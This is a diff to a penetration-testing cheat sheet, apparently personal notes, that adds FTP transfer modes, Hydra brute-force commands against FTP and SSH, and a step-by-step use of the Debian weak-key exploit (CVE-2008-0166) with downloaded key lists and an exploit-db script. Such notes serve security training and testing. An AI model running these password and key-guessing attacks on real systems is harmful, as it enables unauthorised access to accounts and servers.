@@ -154,6 +154,8 @@ binary
 
 Download a file.
 ```bash
+passive
+binary
 get file.txt
 ```
 
@@ -169,6 +171,8 @@ wget -m ftp://anonymous:anonymous@$TARGET:21 -nd
 
 Upload a file.
 ```bash
+passive
+binary
 put poo.txt
 ```
 
@@ -177,10 +181,35 @@ End a FTP session.
 exit
 ```
 
+Brute Force with Hydra
+```bash
+hydra -V -f -L <USERS_LIST> -P <PASSWORDS_LIST> ftp://<IP> -u -vV
+```
+
 #### SSH
 TCP port 22.
 ```bash
 hydra -l root -P /usr/share/wordlists/rockyou.txt  ssh://10.11.12.13
+```
+
+Brute Force with Hydra
+```bash
+hydra -V -f -L <USERS_LIST> -P <PASSWORDS_LIST> ssh://<IP> -u -vV
+```
+CVE-2008-0166
+```bash
+All SSL and SSH keys generated on Debian-based systems (Ubuntu, Kubuntu, etc) between September 2006 and May 13th, 2008 may be affected.
+
+https://www.exploit-db.com/exploits/5720
+
+wget https://github.com/g0tmi1k/debian-ssh/raw/master/common_keys/debian_ssh_rsa_2048_x86.tar.bz2 https://github.com/g0tmi1k/debian-ssh/raw/master/common_keys/debian_ssh_dsa_1024_x86.tar.bz2
+
+bunzip2 debian_ssh_rsa_2048_x86.tar.bz2 debian_ssh_dsa_1024_x86.tar.bz2
+tar -xvf debian_ssh_rsa_2048_x86.tar
+tar -xvf debian_ssh_dsa_1024_x86.tar
+
+python 5720 rsa/2048 <IP> <USER> <PORT> <THREADS>
+python 5720 dsa/1024 <IP> <USER> <PORT> <THREADS>
 ```
 
 #### SMTP
